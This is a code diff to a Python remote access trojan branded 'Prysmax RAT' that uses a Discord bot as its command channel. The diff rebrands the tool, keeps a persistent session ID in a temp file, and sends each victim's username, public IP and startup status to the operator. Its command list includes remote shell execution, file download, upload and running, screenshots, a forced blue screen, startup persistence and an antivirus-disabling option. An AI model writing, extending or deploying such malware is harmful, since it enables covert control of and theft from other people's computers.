@@ -4,13 +4,14 @@ import requests
 import subprocess
 import ctypes
 import sys
+import tempfile
 from mss import mss
 
 
 login = os.getlogin()
 
 client = discord.Client(intents=discord.Intents.all())
-session_id = os.urandom(8).hex()
+session_id = open(os.path.join(tempfile.gettempdir(), 'session_id.txt'), 'r').read().strip() if os.path.exists(os.path.join(tempfile.gettempdir(), 'session_id.txt')) else open(os.path.join(tempfile.gettempdir(), 'session_id.txt'), 'w').write((session_id := os.urandom(8).hex())) or session_id
 
 bot_token = "bot-token"
 guild_id = "guild-id"
@@ -18,13 +19,14 @@ Disable_AV = False
 startup_for = False
 
 commands = "\n".join([
+    "- Prysmax RAT -",
     "help - Help Command",
     "ping - Ping Command",
     "cd - Change Directory",
     "ls - List Directory",
     "download <file> - Download File",
     "upload <link> - Upload File",
-    "cmd - Execute CMD Command",
+    "shell - Execute CMD Command",
     "run <file> - Run an File",
     "screenshot - Take a Screenshot",
     "blue - DeadScreen",
@@ -150,17 +152,23 @@ async def on_ready():
         
         if startup_for == True:
             startup_is = True
+        else:
+            startup_is = False
             startup()
         if Disable_AV == True:
             disableav()
         ip_address = requests.get("https://ipapi.co/json/").json()
         data= ip_address['country_name'], ip_address['ip']
-        embed = discord.Embed(title="Session Reconnected!", description="", color=0xfafafa)
+        embed = discord.Embed(title="Session Reconnected!", description="Prysmax are Ready Again!", color=0x7289DA)
         embed.add_field(name="Session ID", value=f"```{session_id}```", inline=True)
+        embed.add_field(name="RAT", value=f"```Prysmax RAT```", inline=True)
+
         embed.add_field(name="Username", value=f"```{os.getlogin()}```", inline=True)
         embed.add_field(name="IP Address", value=f"```{data}```", inline=True)
         embed.add_field(name="Startup", value=f"```{startup_is}```", inline=True)
-        embed.add_field(name="Commands", value=f"```{commands}```", inline=False)
+        embed.add_field(name="Commands", value=f"```{commands}```", inline=True)
+        embed.set_footer(text="Powered by prysmaxsoftware.cloud", icon_url="https://i.imgur.com/ntz643t.jpeg")
+
         
         await channel.send(embed=embed)
     else:
@@ -169,12 +177,17 @@ async def on_ready():
         startup_is = startup()
         ip_address = requests.get("https://ipapi.co/json/").json()
         data= ip_address['country_name'], ip_address['ip']
-        embed = discord.Embed(title="New session created", description="", color=0xfafafa)
+        embed = discord.Embed(title="New Session Created", description="Welcome to Prysmax RAT", color=0x7289DA)
         embed.add_field(name="Session ID", value=f"```{session_id}```", inline=True)
+        embed.add_field(name="RAT", value=f"```Prysmax RAT```", inline=True)
         embed.add_field(name="Username", value=f"```{os.getlogin()}```", inline=True)
         embed.add_field(name="IP Address", value=f"```{data}```", inline=True)
         embed.add_field(name="Startup", value=f"```{startup_is}```", inline=True)
-        embed.add_field(name="Commands", value=f"```{commands}```", inline=False)
+        embed.add_field(name="Commands", value=f"```{commands}```", inline=True)
+        embed.set_footer(text="Powered by prysmaxsoftware.cloud", icon_url="https://i.imgur.com/ntz643t.jpeg")
+
+
+
         
         await channel.send(embed=embed)
 @client.event
@@ -247,10 +260,6 @@ async def on_message(message):
     if message.content.startswith("exit"):
         await message.channel.delete()
         await client.close()
-    
-    # if message.content.startswith("startup"):
-    #     await message.reply("Done Boss")
-    #     await startup()
         
     if message.content.startswith("blue"):
         await message.reply("Attempting...", delete_after = .1)
